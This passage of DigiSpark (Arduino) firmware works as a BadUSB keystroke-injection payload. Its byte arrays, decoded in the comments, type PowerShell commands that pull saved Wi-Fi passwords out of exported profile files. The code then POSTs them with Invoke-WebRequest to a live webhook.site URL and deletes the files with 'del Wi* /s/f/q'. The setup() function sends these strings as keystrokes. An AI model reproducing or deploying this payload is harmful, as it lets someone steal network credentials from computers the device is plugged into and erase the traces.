...
const uint8_t key_arr_3[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,22, 0,8, 0,15, 0,8, 0,6, 0,23, 0,56, 2,22, 0,23, 0,21, 0,12, 0,17, 0,10, 0,44, 0,56, 2,19, 0,4, 0,23, 0,11, 0,44, 2,26, 0,12, 0,56, 2,9, 0,12, 2,48, 0,55, 0,27, 0,16, 0,15, 0,44, 0,56, 2,19, 0,4, 0,23, 0,23, 0,8, 0,21, 0,17, 0,44, 0,45, 0,14, 0,8, 0,28, 2,16, 0,4, 0,23, 0,8, 0,21, 0,12, 0,4, 0,15, 0,45, 0,44, 2,100, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
// powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4 -Method POST -InFile WiFi-Key
const uint8_t key_arr_4[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 2,12, 0,17, 0,25, 0,18, 0,14, 0,8, 0,56, 2,26, 0,8, 0,5, 2,21, 0,8, 0,20, 0,24, 0,8, 0,22, 0,23, 0,44, 0,56, 2,24, 0,21, 0,12, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,55, 2,36, 2,36, 0,26, 0,8, 0,5, 0,11, 0,18, 0,18, 0,14, 0,55, 0,22, 0,12, 0,23, 0,8, 2,36, 0,32, 0,33, 0,5, 0,7, 0,8, 0,33, 0,39, 0,7, 0,56, 0,30, 0,32, 0,37, 0,4, 0,56, 0,33, 0,8, 0,6, 0,36, 0,56, 0,38, 0,5, 0,31, 0,35, 0,56, 0,5, 0,37, 0,6, 0,34, 0,8, 0,37, 0,30, 0,7, 0,33, 0,36, 0,5, 0,33, 0,44, 0,56, 2,16, 0,8, 0,23, 0,11, 0,18, 0,7, 0,44, 2,19, 2,18, 2,22, 2,23, 0,44, 0,56, 2,12, 0,17, 2,9, 0,12, 0,15, 0,8, 0,44, 2,26, 0,12, 2,9, 0,12, 0,56, 2,14, 0,8, 0,28};
// del Wi* /s/f/q
...
void setup() {
    ...
    DigiKeyboard.delay(1800); // DELAY 1500
    ...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING powershell Select-String -Path Wi-Fi*.x...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING powershell Invoke-WebRequest -Uri https://webhook.site/34bde40d-138a-4ec7-9b26-b8c5e81d47b4
    DigiKeyboard.delay(400); // DELAY 400
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
